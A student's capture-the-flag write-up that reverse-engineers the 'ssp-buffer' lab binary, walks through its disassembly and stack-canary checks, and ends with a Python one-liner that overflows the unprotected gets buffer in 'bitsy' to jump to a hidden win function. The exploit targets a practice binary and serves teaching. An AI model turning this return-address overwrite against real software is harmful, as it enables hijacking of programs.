---
title:  "Writeup: Solving SSP-Buffer"
date:   2019-04-26 12:30:00
categories: writeup
author: Jake Grycel
layout: post
---

To start this challenge, let's first look at the name of the binary: ssp-buffer.
SSP-Buffer is an abbreviation for 'Stack Smashing Protection Buffer', which is
essentially fancy language for the **stack canaries** we've discussed in class.
While your first instinct may be to prepare for leaking a canary value in order
to craft an acceptable buffer overflow payload (as mine was), we should look for
vulnerabilities to exploit.

Since we only have the binary to work on, we need some sort of disassembly tool
to figure out what is going on in this program. While this challenge ends up not
being too complex, and is doable just using GDB, I solved it using
[Cutter](https://github.com/radareorg/cutter), which is a reverse engineering
GUI built on Radare2. Some of the nice features of Cutter is that it has a built
in pseudo-code generator that produces C (like) code that represents the binary,
and that it has a control flow map that shows how the program jumps between
blocks of code. I'll mainly use the output from Cutter in this writeup, but I'll
also include GDB commands that will give you the same result

Let's first look at what functions we have in the binary (`objdump -t ssp-buffer`).
From the function, list we see four interesting entries: `main`, `win`, `bitsy`,
and `nijntje`. So let's disassemble main and see what the program does (`gdb> disas main`).
The Cutter disassembly includes helpful information like strings that are compared,
and visualizations of the control flow.

```
/ (fcn) main 169
|   int main (int argc, char **argv, char **envp);
|           ; var char *s1 @ rbp-0x50
|           ; var char *s @ rbp-0x40
|           ; arg int32_t arg_50h @ rbp+0x50
|           0x00400895      push rbp
|           0x00400896      mov  rbp, rsp
|           0x00400899      sub  rsp, 0x50 ; 'P'
|           0x0040089d      mov  rdx, qword [obj.stdin] ; obj.stdin__GLIBC_2.2.5 ; [0x601080:8]=0 ; FILE *stream
|           0x004008a4      lea  rax, [s]
|           0x004008a8      mov  esi, 0x40 ; '@' ; 64 ; int size
|           0x004008ad      mov  rdi, rax ; char *s
|           0x004008b0      call sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
|           0x004008b5      mov  rdx, qword [obj.stdin] ; obj.stdin__GLIBC_2.2.5 ; [0x601080:8]=0 ; FILE *stream
|           0x004008bc      lea  rax, [s1]
|           0x004008c0      mov  esi, 0xa ; int size
|           0x004008c5      mov  rdi, rax ; char *s
|           0x004008c8      call sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
|           0x004008cd      test rax, rax
|       ,=< 0x004008d0      jne  0x4008d9
|       |   0x004008d2      mov  eax, 0xffffffff ; -1
|      ,==< 0x004008d7      jmp  0x40093c
|      |`-> 0x004008d9      lea  rax, [s1]
|      |    0x004008dd      mov  esi, 0x400a1c ; const char *s2
|      |    0x004008e2      mov  rdi, rax ; const char *s1
|      |    0x004008e5      call sym.imp.strcspn ; size_t strcspn(const char *s1, const char *s2)
|      |    0x004008ea      mov  byte [rbp + rax - 0x50], 0
|      |    0x004008ef      lea  rax, [s1]
|      |    0x004008f3      mov  edx, 0xa ; size_t n
|      |    0x004008f8      mov  esi, str.nijntje ; 0x400a1e ; "nijntje" ; const char *s2
|      |    0x004008fd      mov  rdi, rax ; const char *s1
|      |    0x00400900      call sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
|      |    0x00400905      test eax, eax
|      |,=< 0x00400907      jne  0x400913
|      ||   0x00400909      mov  eax, 0
|      ||   0x0040090e      call sym.nijntje
|      |`-> 0x00400913      lea  rax, [s1]
|      |    0x00400917      mov  edx, 0xa ; size_t n
|      |    0x0040091c      mov  esi, str.bitsy ; 0x400a26 ; "bitsy" ; const char *s2
|      |    0x00400921      mov  rdi, rax ; const char *s1
|      |    0x00400924      call sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
|      |    0x00400929      test eax, eax
|      |,=< 0x0040092b      jne  0x400937
|      ||   0x0040092d      mov  eax, 0
|      ||   0x00400932      call sym.bitsy
|      |`-> 0x00400937      mov  eax, 0
|      `--> 0x0040093c      leave
\           0x0040093d      ret
            0x0040093e      nop
```

To summarize what is happening here, the program:
1. Allocates an 80 byte buffer for user input
2. Waits for an input (but doesn't check it)
3. Waits for a second input
4. Compares the input to "nijntje" -- calls `nijntje` if there's a match
5. Compares the input to "bitsy" -- calls `bitsy` if there's a match

Unfortunately, there is no call to `win`, so we'll have to insert the address of
`win` somehow to get it to run. There's a buffer in main, but it may be a
nuiscance to exploit since there are so many function calls and jumps. So, let's
look at `nijntje` and `bitsy`.

(`gdb> disas nijntje`)

```
/ (fcn) sym.nijntje 79
|   sym.nijntje ();
|           ; var char *s @ rbp-0x90
|           ; var int32_t canary @ rbp-0x8
|           0x00400820      push rbp
|           0x00400821      mov  rbp, rsp
|           0x00400824      sub  rsp, 0x90
|           0x0040082b      mov  rax, qword fs:[0x28] ; [0x28:8]=-1 ; '(' ; 40
|           0x00400834      mov  qword [canary], rax
|           0x00400838      xor  eax, eax
|           0x0040083a      mov  edi, str.nijntje_entered ; 0x4009fe ; "nijntje entered" ; const char *s
|           0x0040083f      call sym.imp.puts ; int puts(const char *s)
|           0x00400844      lea  rax, [s]
|           0x0040084b      mov  rdi, rax ; char *s
|           0x0040084e      mov  eax, 0
|           0x00400853      call sym.imp.gets ; char *gets(char *s)
|           0x00400858      nop
|           0x00400859      mov  rax, qword [canary]
|           0x0040085d      xor  rax, qword fs:[0x28]
|       ,=< 0x00400866      je   0x40086d
|       |   0x00400868      call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x0040086d      leave
\           0x0040086e      ret
```

`nijntje` prints out a "nijntje entered" string, looks for an input from stdin,
and returns after checking a stack canary. If we were to overflow this buffer to
overwrite the return address, we would also have to leak the canary value and 
insert that into our exploit string. Maybe there's another way around this.
Let's look at `bitsy` (`gdb> disas bitsy`).

```
/ (fcn) sym.bitsy 38
|   sym.bitsy ();
|           ; var char *s @ rbp-0x40
|           0x0040086f      push rbp
|           0x00400870      mov  rbp, rsp
|           0x00400873      sub  rsp, 0x40 ; '@'
|           0x00400877      mov  edi, str.bitsy_entered ; 0x400a0e ; "bitsy entered" ; const char *s
|           0x0040087c      call sym.imp.puts ; int puts(const char *s)
|           0x00400881      lea  rax, [s]
|           0x00400885      mov  rdi, rax ; char *s
|           0x00400888      mov  eax, 0
|           0x0040088d      call sym.imp.gets ; char *gets(char *s)
|           0x00400892      nop
|           0x00400893      leave
\           0x00400894      ret
```

`bitsy` does pretty much the same thing, except there's no stack canary check,
so let's use this for a buffer overflow attack. First, we know that `bitsy`
allocates a 64 byte buffer for user input, so we'll have to enter 64 bytes of
garbage to fill the buffer. At the end of the function, `leave` updates the
stack pointer to point to the current frame base pointer, and restores the base
pointer for the original calling function:

```
leave:
mov esp, ebp
pop ebp
```

The `ret` instruction pops the next value off of the stack, and loads that value
into the instruction pointer as the return address. So, considering the buffer,
the old base pointer, we have 64 buffer bytes + 8 base pointer bytes for a total
of 72 bytes to write/overflow before writing the address of win to hijack the
program flow (`gdb> p win`).

However, we also need to provide the program with the initial random input and 
the "bitsy" input before giving our overflow string. To create this entire input
we can use the following python script:

python -c 'print "bitsy\n" + "bitsy\n" + "a"*72 + "\xc6\x07\x40"'
